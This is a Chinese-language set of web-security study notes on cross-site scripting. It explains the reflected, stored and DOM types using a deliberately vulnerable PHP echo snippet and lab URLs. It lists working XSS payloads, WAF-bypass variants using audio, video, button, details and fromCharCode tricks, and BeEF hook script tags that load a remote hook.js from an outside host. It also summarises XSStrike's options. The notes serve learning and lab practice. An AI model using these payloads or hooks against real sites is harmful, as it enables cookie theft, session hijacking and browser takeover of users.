# 1.XSS 简介与危害
跨站脚本攻击 XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style
Sheets，CSS)的缩写混淆 故将跨站脚本攻击缩写为 XSS
恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页面时，嵌入 Web 里面的Script 代码会被执行，从而达到恶意攻击用户的目的。
危害
1、盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
3、盗窃企业重要的具有商业价值的资料
4、非法转账
5、强制发送电子邮件
6、网站挂马
7、控制受害者机器向其它网站发起攻击（重定向语句）
8、窃取 cookie 的 sessionid，冒充登录。

# 2.反射型与存储型 XSS
xss 攻击可分为三类：反射型、存储型、dom 型，很容易混淆的是反射和 dom 类型

反射型
案例 1
编写代码
`<?php`
`$xss = $_GET['x'];`
`echo $xss;`
`?>`
使用浏览量访问
http://localhost/1.php?x=1
http://localhost/1.php?x=<script>alert(1)</script>

案例 2
"pikachu" && country="CN" && title="Get the pikachu"
<script>alert(1)</script>


存储型
案例
http://111.230.104.121:8765/vul/xss/xss_stored.php
<script>alert(1)</script>
总结:攻击数据存储在服务器，攻击一直持续下去，危害比反射大

dom 型
案例
http://111.230.104.121:8765/vul/xss/xss_dom.php
#' onclick="alert(1)"
javascript:alert(123)
总结：DOM 型与服务器没有太大的关系，不需要和服务器交互，攻击纯粹发生在客户端。


过滤：
<ScrIPT>alert(1)</SCrIPT>

beef:
<script src="http://192.168.163.133:3000/hook.js"/>
<script src="http://192.168.163.133:3000/hook.js"></script>
<script>alert(document.cookie)</script>


XSS 修复
开启 AWF
（安全狗）环境准备
cd C:\Users\86188\Desktop\tool\phpStudy\PHPTutorial\Apache\bin
httpd.exe -k install -n apache2.0
#如果要删除
sc delete apache2.0




手工绕过
标签语法替换
就是使用其他标签来替换，不同 WAF 过滤的手段并不一样，需要自己尝试
audio 标签
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror=javascript:alert(1)></audio>

video 标签
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>

button 标签
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1) >xss</button>


加密算法
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >


XSStrike
可识别并绕过 WAF 的 XSS 扫描工具 
https://github.com/s0md3v/XSStrike

参数
-h, --help //显示帮助信息
-u, --url //指定目标 URL
--data //POST 方式提交内容
-v, --verbose //详细输出
-f, --file //加载自定义 paload 字典
-t, --threads //定义线程数
-l, --level //爬行深度
-t, --encode //定义 payload 编码方式
--json //将 POST 数据视为 JSON
--path //测试 URL 路径组件
--seeds //从文件中测试、抓取 URL
--fuzzer //测试过滤器和 Web 应用程序防火墙。
--update //更新
--timeout //设置超时时间
--params //指定参数
--crawl //爬行
--proxy //使用代理
--blind //盲测试
--skip //跳过确认提示
--skip-dom //跳过 DOM 扫描
--headers //提供 HTTP 标头
-d, --delay //设置延迟


==1.php 必须是一个正确的 html 页面==
直接探测
python xsstrike.py -u  "http://localhost/xxs/1.php?x=1"

fuzz 测试
pip install -r requirements.txt
python xsstrike.py -u  "http://localhost/xxs/1.php?x=1"  --fuzzer


fuzz
http://localhost/xss/1.php?x=1
BurpSuite payload加载
https://github.com/tennc/fuzzdb/